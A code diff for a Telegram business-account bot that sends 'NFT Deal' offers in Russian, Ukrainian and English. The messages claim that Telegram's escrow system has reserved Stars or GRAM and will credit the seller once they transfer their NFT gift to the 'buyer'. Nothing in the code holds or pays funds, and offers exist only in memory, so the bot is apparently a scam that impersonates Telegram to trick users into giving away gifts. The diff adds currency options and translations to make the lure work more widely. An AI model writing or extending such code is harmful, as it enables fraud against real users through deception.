@@ -20,10 +20,80 @@ bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
 
 GIFT_RE = re.compile(r"t\.me/nft/([A-Za-z]+?)-(\d+)")
+# формат: .buy <ссылка> <сумма> <s|g> [uk|en]
 CMD_RE  = re.compile(
-    r"^\.buy\s+(https?://t\.me/nft/\S+)\s+(\d+)(?:\s+gram)?",
+    r"^\.buy\s+(https?://t\.me/nft/\S+)\s+(\d+)\s+(s|g)(?:\s+(uk|en))?",
     re.IGNORECASE
 )
+
+TEXTS = {
+    "ru": {
+        "title":    "NFT Deal",
+        "offer":    "Пользователь предлагает вам",
+        "for":      "за подарок",
+        "valid":    "Оффер действителен ещё",
+        "order":    "Ордер",
+        "reserved": "Покупатель зарезервировал",
+        "escrow":   "через эскроу-систему Telegram. Средства хранятся на специальном эскроу-счёте и будут автоматически зачислены на ваш баланс",
+        "after":    "сразу после передачи подарка.",
+        "instr":    "Инструкция для завершения сделки:",
+        "step1":    "Передайте подарок пользователю:",
+        "step2":    "Нажмите «Передать NFT» и выберите",
+        "step3":    "Подтвердите передачу подарка.",
+        "credits":  "Telegram зафиксирует транзакцию и моментально зачислит",
+        "balance":  "на ваш баланс. Резерв действует 24 часа.",
+        "declined": "отклонён.",
+        "offer_btn":"Оффер отклонён.",
+        "warn":     "Внимание!\n\nСледуйте инструкции, чтобы не потерять подарок и получить оплату.\n\nНажмите «ОК», если вы прочитали это сообщение.",
+        "transfer": "Передать NFT ↗",
+        "accept":   "Принять",
+        "decline":  "Отклонить",
+    },
+    "uk": {
+        "title":    "NFT Deal",
+        "offer":    "Користувач пропонує вам",
+        "for":      "за подарунок",
+        "valid":    "Пропозиція дійсна ще",
+        "order":    "Замовлення",
+        "reserved": "Покупець зарезервував",
+        "escrow":   "через ескроу-систему Telegram. Кошти зберігаються на спеціальному ескроу-рахунку та будуть автоматично зараховані на ваш баланс",
+        "after":    "одразу після передачі подарунку.",
+        "instr":    "Інструкція для завершення угоди:",
+        "step1":    "Передайте подарунок користувачу:",
+        "step2":    "Натисніть «Передати NFT» та виберіть",
+        "step3":    "Підтвердіть передачу подарунку.",
+        "credits":  "Telegram зафіксує транзакцію та миттєво зарахує",
+        "balance":  "на ваш баланс. Резерв діє 24 години.",
+        "declined": "відхилено.",
+        "offer_btn":"Пропозицію відхилено.",
+        "warn":     "Увага!\n\nДотримуйтесь інструкції, щоб не втратити подарунок та отримати оплату.\n\nНатисніть «ОК», якщо ви прочитали це повідомлення.",
+        "transfer": "Передати NFT ↗",
+        "accept":   "Прийняти",
+        "decline":  "Відхилити",
+    },
+    "en": {
+        "title":    "NFT Deal",
+        "offer":    "A user offers you",
+        "for":      "for the gift",
+        "valid":    "Offer valid for another",
+        "order":    "Order",
+        "reserved": "The buyer has reserved",
+        "escrow":   "via Telegram escrow. Funds are held in a dedicated escrow account and will be automatically credited to your balance",
+        "after":    "immediately after the gift is transferred.",
+        "instr":    "Instructions to complete the deal:",
+        "step1":    "Transfer the gift to:",
+        "step2":    "Tap «Transfer NFT» and select",
+        "step3":    "Confirm the gift transfer.",
+        "credits":  "Telegram will record the transaction and instantly credit",
+        "balance":  "to your balance. The reserve is valid for 24 hours.",
+        "declined": "declined.",
+        "offer_btn":"Offer declined.",
+        "warn":     "Attention!\n\nFollow the instructions to avoid losing the gift and to receive your payment.\n\nPress «OK» if you have read this message.",
+        "transfer": "Transfer NFT ↗",
+        "accept":   "Accept",
+        "decline":  "Decline",
+    },
+}
 
 # хранилище активных офферов в памяти: order_id → dict
 offers: dict = {}
@@ -48,34 +118,48 @@ def fmt_remaining(sent_at: datetime) -> str:
     h, m = divmod(total_min, 60)
     return f"{h} ч. {m} мин."
 
-def build_offer_plain(amount, gift_name, gift_num, order_id, recipient, sent_at):
+def fmt_currency(amount, currency):
+    if currency == "stars":
+        return f"<b>{amount:,} ⭐ Stars</b>"
+    return f"<b>{amount:,} GRAM</b>"
+
+def fmt_currency_short(amount, currency):
+    if currency == "stars":
+        return f"{amount:,} ⭐ Stars"
+    return f"{amount:,} GRAM"
+
+def build_offer_plain(amount, currency, gift_name, gift_num, order_id, recipient, sent_at):
     return (
+        f"NFT Deal\n\n"
         f"Пользователь предлагает вам "
-        f"<b>{amount:,} 💎 Gram</b> за подарок <b>{gift_name} #{gift_num}</b>.\n\n"
+        f"{fmt_currency(amount, currency)} за подарок <b>{gift_name} #{gift_num}</b>.\n\n"
         f"Оффер действителен ещё <b>{fmt_remaining(sent_at)}</b>"
     )
 
-def build_offer_linked(amount, gift_name, gift_num, order_id, recipient, url, sent_at):
+def build_offer_linked(amount, currency, gift_name, gift_num, order_id, recipient, url, sent_at):
     return (
+        f"NFT Deal\n\n"
         f"Пользователь предлагает вам "
-        f"<b>{amount:,} 💎 Gram</b> за подарок "
+        f"{fmt_currency(amount, currency)} за подарок "
         f"<b><a href=\"{url}\">{gift_name} #{gift_num}</a></b>.\n\n"
         f"Оффер действителен ещё <b>{fmt_remaining(sent_at)}</b>"
     )
 
-def build_deal(amount, gift_name, gift_num, order_id, recipient, url):
+def build_deal(amount, currency, gift_name, gift_num, order_id, recipient, url):
+    cur = fmt_currency_short(amount, currency)
     return (
+        f"NFT Deal\n\n"
         f"Ордер <b>#{order_id}</b>\n\n"
-        f"Покупатель зарезервировал <b>{amount:,} 💎 Gram</b> через эскроу-систему "
+        f"Покупатель зарезервировал <b>{cur}</b> через эскроу-систему "
         f"Telegram. Средства хранятся на специальном эскроу-счёте и будут автоматически "
-        f"зачислены на ваш баланс сразу после передачи подарка.\n\n"
+        f"зачислены на ваш баланс {('GRAM' if currency == 'gram' else 'Stars')} сразу после передачи подарка.\n\n"
         f"<b>Инструкция для завершения сделки:</b>\n"
         f"1. Передайте подарок пользователю: @{recipient}\n"
         f"2. Нажмите «Передать NFT» и выберите "
         f"<a href=\"{url}\">{gift_name} #{gift_num}</a>\n"
         f"3. Подтвердите передачу подарка.\n\n"
         f"Telegram зафиксирует транзакцию и моментально зачислит "
-        f"<b>{amount:,} 💎 Gram</b> на ваш баланс. Резерв действует 24 часа."
+        f"<b>{cur}</b> на ваш баланс. Резерв действует 24 часа."
     )
 
 def offer_kb(order_id: str):
@@ -112,6 +196,7 @@ async def handle_business_message(message: Message):
 
     link      = m.group(1)
     amount    = int(m.group(2))
+    currency  = (m.group(3) or "gram").lower()  # gram | stars
 
     # recipient — тот, кто написал .buy (покупатель)
     recipient = message.chat.username or str(message.chat.id)
@@ -130,7 +215,7 @@ async def handle_business_message(message: Message):
     try:
         sent = await bot.send_message(
             chat_id=chat_id,
-            text=build_offer_plain(amount, gift_name, gift_num, order_id, recipient, sent_at),
+            text=build_offer_plain(amount, currency, gift_name, gift_num, order_id, recipient, sent_at),
             reply_markup=offer_kb(order_id),
             business_connection_id=bcid,
             link_preview_options=LinkPreviewOptions(is_disabled=True),
@@ -141,7 +226,7 @@ async def handle_business_message(message: Message):
 
     # Сохраняем оффер
     offers[order_id] = {
-        "amount": amount, "gift_name": gift_name, "gift_num": gift_num,
+        "amount": amount, "currency": currency, "gift_name": gift_name, "gift_num": gift_num,
         "nft_url": nft_url, "recipient": recipient, "order_id": order_id,
         "sent_at": sent_at, "chat_id": chat_id, "msg_id": sent.message_id,
         "bcid": bcid, "status": "offer",
@@ -162,7 +247,7 @@ async def handle_business_message(message: Message):
         await bot.edit_message_text(
             chat_id=chat_id,
             message_id=sent.message_id,
-            text=build_offer_linked(amount, gift_name, gift_num, order_id, recipient, nft_url, sent_at),
+            text=build_offer_linked(amount, currency, gift_name, gift_num, order_id, recipient, nft_url, sent_at),
             reply_markup=offer_kb(order_id),
             business_connection_id=bcid,
             link_preview_options=LinkPreviewOptions(
@@ -197,7 +282,7 @@ async def cb_accept(call: CallbackQuery):
         await bot.edit_message_text(
             chat_id=call.message.chat.id,
             message_id=call.message.message_id,
-            text=build_deal(d["amount"], d["gift_name"], d["gift_num"],
+            text=build_deal(d["amount"], d["currency"], d["gift_name"], d["gift_num"],
                             order_id, d["recipient"], d["nft_url"]),
             reply_markup=deal_kb(d["recipient"]),
             business_connection_id=d["bcid"],
